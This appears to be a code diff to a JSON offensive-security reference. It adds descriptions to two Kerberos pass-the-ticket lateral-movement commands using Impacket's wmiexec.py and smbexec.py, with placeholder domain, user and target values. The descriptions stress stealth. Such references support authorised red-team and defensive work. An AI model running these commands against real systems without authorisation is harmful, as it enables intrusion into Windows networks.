@@ -213,11 +213,13 @@
   "variations": [
     {
       "label": "wmiexec with ticket",
-      "command": "KRB5CCNAME=<ccache> wmiexec.py -k -no-pass <domain>/<user>@<target_fqdn>"
+      "command": "KRB5CCNAME=<ccache> wmiexec.py -k -no-pass <domain>/<user>@<target_fqdn>",
+      "description": "Uses Impacket wmiexec for semi-interactive shell access via Windows Management Instrumentation (WMI). Executes commands through the DCOM/WMI service - more stealthy than PsExec as it does not write a service binary to disk."
     },
     {
       "label": "smbexec with ticket",
-      "command": "KRB5CCNAME=<ccache> smbexec.py -k -no-pass <domain>/<user>@<target_fqdn>"
+      "command": "KRB5CCNAME=<ccache> smbexec.py -k -no-pass <domain>/<user>@<target_fqdn>",
+      "description": "Uses Impacket smbexec for command execution through the Windows Service Control Manager. Sends commands via SMB without uploading a binary - each command creates a temporary batch file on the target."
     }
   ],
   "steps": [
